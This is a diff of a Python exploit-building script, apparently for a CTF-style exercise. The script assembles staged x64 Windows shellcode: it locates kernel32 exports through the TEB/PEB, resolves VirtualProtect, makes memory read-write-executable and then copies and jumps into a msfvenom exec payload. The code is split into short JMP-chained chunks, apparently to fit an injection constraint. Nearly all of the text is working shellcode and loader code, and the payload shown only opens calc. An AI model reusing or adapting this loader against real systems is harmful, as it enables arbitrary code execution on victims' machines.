@@ -6,7 +6,7 @@ from pwn import p32
 
 JMP = b'\xeb\x0c'
 JMP2 = b'\xeb\x0f'
-JMP2_LIMIT = 18
+JMP2_LIMIT = 17
 COUNT = 0
 SHOW_RES = True
 
@@ -27,14 +27,14 @@ def add_JMP(code, JMP):
         print(f'''  {tod(code.ljust(6, NOP) + JMP)},''')
         code_list.append(code)
 
-def disasm64(opcode, arch, mode, detail=True):
+def disasm64(opcode, arch, mode, show=False, detail=True):
     ctx = Cs(arch, mode)
     ctx.detail = detail
     global COUNT
 
     for l in ctx.disasm(opcode, 0):
         COUNT+=1
-        if SHOW_RES == False:
+        if show == True:
             print(l)
             continue
         if len(l.bytes) > 6:
@@ -57,31 +57,71 @@ def asm64(assembly_code):
         res += bytes(code)
     return res
 
-sp = b"\xcc" # bp
-#sp = b"f\x83\xe4\xf0Pj`ZhcalcTYH)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W<\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad"
-sp += b"f\x83\xe4\xf0Pj`ZH)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W<\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad"
+def just_dis(opcode, arch, mode):
+    ctx = Cs(arch, mode)
+    ctx.detail = True
+    for l in ctx.disasm(opcode, 0):
+        print(l)
 
-# sp += b"H\x01\xf8"   # add rax, rdi
-# sp += b"\x818WinE"   # cmp dword ptr [rax], 0x456e6957
+sp = b""
+# sp = b"\xcc"
 
-sp += b"H\x8dD\x07\x04"    # lea rax, [rdi+rax+4]
-sp += b"\x818ualP"     # cmp dword ptr [rax] ualP
-sp += b"\x0f\x85" + p32(-0x79&0xffffffff) # jne 0x39
+# stage1: load TEB data from gs register
+sp += b"f\x83\xe4\xf0"                        # and sp, 0xfff0
+sp += b"Pj`"                                  # push rax; push 0x60;
+sp += b"ZH)\xd4"                              # pop rdx; sub rsp; rdx;
+sp += b"eH\x8b2"                              # mov rsi, qword ptr gs:[rdx]
+sp += b"H\x8bv\x18"                           # mov rsi, qword ptr [rsi + 0x18]
+sp += b"H\x8bv\x10"                           # mov rsi, qword ptr [rsi + 0x10]
+sp += b"H\xad"                                # lodsq rax, qword ptr [rsi]
+sp += b"H\x8b0"                               # mov rsi, qword ptr [rax]
+sp += b"H\x8b~0"                              # mov rdi, qword ptr [rsi + 0x30]
+sp += b"\x03W<"                               # add edx, dword ptr [rdi + 0x3c]
+sp += b"\x8b\\\x17("                          # mov ebx, dword ptr [rdi + rdx + 0x28]
+sp += b"\x8bt\x1f "                           # mov esi, dword ptr [rdi + rbx + 0x20]
+sp += b"H\x01\xfe"                            # add rsi, rdi
+sp += b"\x8bT\x1f$"                           # mov edx, dword ptr [rdi + rbx + 0x24]
+sp += b"\x0f\xb7,\x17"                        # movzx ebp, word ptr [rdi + rdx]
+sp += b"\x8dR\x02"                            # lea edx, [rdx + 2]
 
-sp += b"\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99"
+# stage2: find VirtualProtect with "ualP"     # FIND_VirtualProtect:
+sp += b"\xad"                                 # lodsd eax, dword ptr [rsi]
+sp += b"H\x8dD\x07\x04"                       # lea rax, [rdi+rax+4]
+sp += b"\x818ualP"                            # cmp dword ptr [rax], "ualP"
+sp += b"\x0f\x85" + p32(-0x79&0xffffffff)     # jne FIND_VirtualProtect
+sp += b"\x8bt\x1f\x1c"                        # mov esi, dword ptr [rdi + rbx + 0x1c]
+sp += b"H\x01\xfe"                            # add rsi, rdi
+sp += b"\x8b4\xae"                            # mov esi, dword ptr [rsi + rbp*4]
+sp += b"H\x01\xf7"                            # add rdi, rsi
+sp += b"\x99"                                 # cdq
 
-# VirtualProtect
-sp += b"\xe8\x00\x00\x00\x00Yf\x81\xe1\x00\xc0\xba\x00\x00\x02\x00A\xb8@\x00\x00\x00I\x89\xe1I\x83\xc1p"
-# sp += b"\xcc" # bp
-sp += b"\xff\xd7" # call rdi
+# stage3: call VirtualProtect
+# VirtualProtect(&AreaOfShellcode, 0x20000, 0x40:PAGE_EXECUTE_READWRITE, [rsp+0x70]:just writeable);
+sp += b"\xe8\x00\x00\x00\x00"                 # call $5
+sp += b"Y"                                    # pop rcx
+sp += b"f\x81\xe1\x00\xc0"                    # and cx, 0xc000
+sp += b"\xba\x00\x00\x02\x00"                 # mov edx, 0x20000
+sp += b"A\xb8@\x00\x00\x00"                   # mov r8d, 0x40
+sp += b"I\x89\xe1"                            # mov r9, rsp
+sp += b"I\x83\xc1p"                           # add r9, 0x70
+sp += b"\xff\xd7"                             # call rdi
 
-# stage2 : load shellcode
-sp += b"\xe8\x00\x00\x00\x00_\xba\x00\x10\x00\x00H\x89\xfeH)\xd7\xba%\x01\x00\x00H\x01\xd6"
+# stage4: find address of AreaOfShellcode
+sp += b"\xe8\x00\x00\x00\x00"                 # call $5
+sp += b"_"                                    # pop rdi
+sp += b"\xba\x00\x10\x00\x00"                 # mov edx, 0x1000
+sp += b"H\x89\xfe"                            # mov rsi, rdi
+sp += b"H)\xd7"                               # sub rdi, rdx
+sp += b"\xba%\x01\x00\x00"                    # mov edx, 0x125
+sp += b"H\x01\xd6"                            # add rsi, rdx
 
-sp += b"\x81>\xef\xbe\xad\xde"  # cmp dword ptr [rsi], 0xdeadbeef
-sp += b"\x0f\x84" + p32(-0x10b7&0xffffffff)  # je shellcode 
-sp += b"H\xa5\x90H\x83\xc6\x0f"
-sp += b"\xe9" + p32(-0x78&0xffffffff)  # JMP cmp
+# stage5 : load shellcode to AreaOfShellcode
+# loop to load shellcode                      # MOV_SHELLCODE:
+sp += b"\x81>\xef\xbe\xad\xde"                # cmp dword ptr [rsi], 0xdeadbeef
+sp += b"\x0f\x84" + p32(-0x10b7&0xffffffff)   # je AreaOfShellcode 
+sp += b"H\xa5"                                # movsq qword ptr [rdi], qword ptr [rsi]
+sp += b"\x90H\x83\xc6\x0f"                    # nop; add rsi, 0xf;
+sp += b"\xe9" + p32(-0x78&0xffffffff)         # JMP MOV_SHELLCODE
 
 print(PREFIX)
 # disasm64(sp, CS_ARCH_X86, CS_MODE_64, True, False)
@@ -95,7 +135,14 @@ disasm64(sp, CS_ARCH_X86, CS_MODE_64)
 # VirtualProtect - args
 # aa = ["call _next; _next:pop rcx", "and cx, 0xc000", "mov edx, 0x20000", "mov r8d, 0x40", "mov r9, rsp", "add r9, 0x70"]
 
-# load shellcode 
+# load shellcode to [rip-0x3000]
+# aa = ["call _next; _next:pop rdi", "mov edx, 0x1000", "mov rsi, rdi", "sub rdi, rdx", "mov edx, 0x125", "add rsi, rdx"]
+# aa += ["cmp dword ptr [rsi], 0xdeadbeef"]
+# aa = ["movsq [rdi], [rsi]", "nop", "add rsi, 0xf"]
+# res = asm64(aa)
+# print(res)
+
+# shellcode 
 # msfvenom -p windows/x64/exec CMD="calc" -f python
 buf =  b""
 buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
@@ -122,16 +169,13 @@ buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
 buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
 buf += b"\xda\xff\xd5\x63\x61\x6c\x63\x00"
 
-buf = buf + (8 - (len(buf) % 8)) * b"\x90"
-buf += b"\xef\xbe\xad\xde" # end flag
-buf = buf + (8 - (len(buf) % 8)) * b"\x90"
 
-# load shellcode to [rip-0x3000]
-# aa = ["call _next; _next:pop rdi", "mov edx, 0x1000", "mov rsi, rdi", "sub rdi, rdx", "mov edx, 0x125", "add rsi, rdx"]
-# aa += ["cmp dword ptr [rsi], 0xdeadbeef"]
-# aa = ["movsq [rdi], [rsi]", "nop", "add rsi, 0xf"]
-# res = asm64(aa)
-# print(res)
+# print(buf)
+# just_dis(buf, CS_ARCH_X86, CS_MODE_64)
+
+buf = buf + (8 - (len(buf) % 8)) * b"\x90"
+buf += b"\xef\xbe\xad\xde\x90\x90\x90\x90" # end flag
+# buf = buf + (8 - (len(buf) % 8)) * b"\x90"
 
 print("")
 data_list = []
